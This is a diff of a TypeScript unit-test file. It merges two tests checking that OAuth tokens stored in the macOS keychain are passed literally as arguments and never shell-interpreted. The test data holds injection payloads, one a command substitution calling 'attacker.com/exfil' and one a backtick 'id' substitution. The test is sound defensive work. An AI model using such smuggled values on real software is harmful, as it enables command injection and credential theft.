@@ -63,8 +63,8 @@ describe("cli credentials", () => {
 
   afterEach(() => {
     vi.useRealTimers();
-    execSyncMock.mockReset();
-    execFileSyncMock.mockReset();
+    execSyncMock.mockClear().mockImplementation(() => undefined);
+    execFileSyncMock.mockClear().mockImplementation(() => undefined);
     delete process.env.CODEX_HOME;
     resetCliCredentialCachesForTest();
   });
@@ -90,54 +90,43 @@ describe("cli credentials", () => {
     expect((addCall?.[1] as string[] | undefined) ?? []).toContain("-U");
   });
 
-  it("prevents shell injection via malicious OAuth token values", async () => {
-    const maliciousToken = "x'$(curl attacker.com/exfil)'y";
-
-    mockExistingClaudeKeychainItem();
-
-    const ok = writeClaudeCliKeychainCredentials(
+  it("prevents shell injection via untrusted token payload values", async () => {
+    const cases = [
       {
-        access: maliciousToken,
+        access: "x'$(curl attacker.com/exfil)'y",
         refresh: "safe-refresh",
-        expires: Date.now() + 60_000,
+        expectedPayload: "x'$(curl attacker.com/exfil)'y",
       },
-      { execFileSync: execFileSyncMock },
-    );
-
-    expect(ok).toBe(true);
-
-    // The -w argument must contain the malicious string literally, not shell-expanded
-    const addCall = getAddGenericPasswordCall();
-    const args = (addCall?.[1] as string[] | undefined) ?? [];
-    const wIndex = args.indexOf("-w");
-    const passwordValue = args[wIndex + 1];
-    expect(passwordValue).toContain(maliciousToken);
-    // Verify it was passed as a direct argument, not built into a shell command string
-    expect(addCall?.[0]).toBe("security");
-  });
-
-  it("prevents shell injection via backtick command substitution in tokens", async () => {
-    const backtickPayload = "token`id`value";
-
-    mockExistingClaudeKeychainItem();
-
-    const ok = writeClaudeCliKeychainCredentials(
       {
         access: "safe-access",
-        refresh: backtickPayload,
-        expires: Date.now() + 60_000,
+        refresh: "token`id`value",
+        expectedPayload: "token`id`value",
       },
-      { execFileSync: execFileSyncMock },
-    );
+    ] as const;
 
-    expect(ok).toBe(true);
+    for (const testCase of cases) {
+      execFileSyncMock.mockClear();
+      mockExistingClaudeKeychainItem();
 
-    // Backtick payload must be passed literally, not interpreted
-    const addCall = getAddGenericPasswordCall();
-    const args = (addCall?.[1] as string[] | undefined) ?? [];
-    const wIndex = args.indexOf("-w");
-    const passwordValue = args[wIndex + 1];
-    expect(passwordValue).toContain(backtickPayload);
+      const ok = writeClaudeCliKeychainCredentials(
+        {
+          access: testCase.access,
+          refresh: testCase.refresh,
+          expires: Date.now() + 60_000,
+        },
+        { execFileSync: execFileSyncMock },
+      );
+
+      expect(ok).toBe(true);
+
+      // Token payloads must remain literal in argv, never shell-interpreted.
+      const addCall = getAddGenericPasswordCall();
+      const args = (addCall?.[1] as string[] | undefined) ?? [];
+      const wIndex = args.indexOf("-w");
+      const passwordValue = args[wIndex + 1];
+      expect(passwordValue).toContain(testCase.expectedPayload);
+      expect(addCall?.[0]).toBe("security");
+    }
   });
 
   it("falls back to the file store when the keychain update fails", async () => {
